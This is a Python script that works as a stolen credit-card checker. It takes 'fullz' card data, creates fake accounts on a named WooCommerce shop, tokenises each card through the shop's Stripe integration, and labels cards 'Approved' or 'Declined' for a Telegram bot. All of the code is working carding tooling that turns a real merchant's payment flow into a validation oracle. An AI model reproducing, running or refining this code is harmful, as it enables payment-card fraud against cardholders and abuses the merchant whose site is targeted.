import base64
import httpx
import random
import time
import json
import uuid
import asyncio
from fake_useragent import UserAgent
import requests
from defs import *
import re
from html import unescape

# ========================
# Helper
# ========================
def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

# ========================
# Main Payment Method Creator
# ========================
async def create_payment_method(fullz, session):
    try:
        cc, mes, ano, cvv = fullz.split("|")
        user = "paraelsan" + str(random.randint(9999, 574545))
        mail = "paraelsan" + str(random.randint(9999, 574545)) + "@gmail.com"
        pwd = "Paraelsan" + str(random.randint(9999, 574545))

        # --- Register Account ---
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'priority': 'u=0, i',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }
        response = await session.get('https://christianapostles.com/my-account/', headers=headers)
        register = gets(response.text, '"woocommerce-register-nonce" value="', '" />')

        headers.update({
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://christianapostles.com',
            'referer': 'https://christianapostles.com/my-account/',
        })
        data = {
            'username': user,
            'email': mail,
            'password': pwd,
            'woocommerce-register-nonce': register,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }
        await session.post('https://christianapostles.com/my-account/', headers=headers, data=data)

        # --- Navigate to Add Payment ---
        await session.get('https://christianapostles.com/my-account/payment-methods/', headers=headers)
        response = await session.get('https://christianapostles.com/my-account/add-payment-method/', headers=headers)

        pk = gets(response.text, '"publishableKey":"', '"')
        acc = gets(response.text, '"accountId":"', '"')
        nonce = gets(response.text, '"createSetupIntentNonce":"', '"')

        # --- Create Payment Method ---
        headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }
        data = {
            'billing_details[email]': mail,
            'billing_details[address][country]': 'SG',
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_year]': ano,
            'card[exp_month]': mes,
            'key': pk,
            '_stripe_account': acc,
        }
        response = await session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

        try:
            pm_id = response.json()['id']
        except Exception:
            return response.text

        # --- Attach Payment Method ---
        headers = {
            'accept': '*/*',
            'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarye7W44erveCXdazwi',
            'origin': 'https://christianapostles.com',
            'referer': 'https://christianapostles.com/my-account/add-payment-method/',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }
        files = {
            'action': (None, 'create_setup_intent'),
            'wcpay-payment-method': (None, pm_id),
            '_ajax_nonce': (None, nonce),
        }
        response = await session.post('https://christianapostles.com/wp-admin/admin-ajax.php', headers=headers, files=files)

        return response.text
    except Exception as e:
        return str(e)

# ========================
# Telegram-friendly wrapper
# ========================
async def run_checker(cc_normalized: str):
    """
    Runs the checker for a single card and returns dict for Telegram.
    """
    start = time.time()
    async with httpx.AsyncClient(timeout=40) as session:
        result = await create_payment_method(cc_normalized, session)
        response = await charge_resp(result)  # from defs.py

    elapsed = round(time.time() - start, 2)

    # Parse Stripe JSON errors
    error_message = ""
    try:
        json_resp = json.loads(result)
        if "data" in json_resp and "error" in json_resp["data"]:
            full_message = unescape(json_resp["data"]["error"].get("message", "Error")).strip()
            if full_message.startswith("Error: "):
                error_message = full_message[len("Error: "):].strip()
            else:
                error_message = full_message
    except Exception:
        pass

    if error_message:
        status = "Declined"
        message = error_message
    else:
        status = "Approved" if any(
            x in response for x in [
                "Payment method successfully added ✅",
                "CVV MATCH ✅",
                "INSUFFICIENT FUNDS ✅"
            ]
        ) else "Declined"
        message = response

    return {
        "status": status,
        "message": message,
        "time_taken": elapsed
    }
